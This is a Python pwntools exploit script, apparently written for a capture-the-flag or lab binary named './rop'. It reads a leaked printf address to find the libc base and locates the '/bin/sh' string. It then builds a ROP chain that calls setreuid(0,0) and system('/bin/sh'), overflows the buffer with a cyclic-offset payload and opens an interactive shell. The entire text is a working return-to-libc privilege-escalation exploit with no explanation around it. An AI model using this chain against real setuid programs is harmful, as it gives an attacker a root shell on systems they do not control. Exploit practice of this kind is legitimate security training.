from pwn import *

# context.log_level = 'DEBUG'

context.binary = e = ELF('./rop', checksec=False)
libc = e.libc
p = process('./rop')

def db(x):
    gdb.attach(x)
    pause()

p.recvuntil('address: ')
printf = int(p.recvuntil(b'\n', drop=True), 16)
libc_base = printf - libc.symbols['printf']

log.info(f'libc_base: {libc_base:x}')

libc.address = libc_base
binsh = next(libc.search(b'/bin/sh\x00'))
log.info(f'binsh: {binsh:x}')

rop = ROP([libc])
rop.setreuid(0, 0)
rop.system(binsh, 0, 0)
# rop.rsi = 0
# rop.rdx = 0
# rop.call(libc_base + 0xe3b04)
print(rop.dump())

pay = b''
pay += cyclic(cyclic_find(0x6161617461616173))
pay += rop.chain()

# db(p)

p.send(pay)

p.interactive()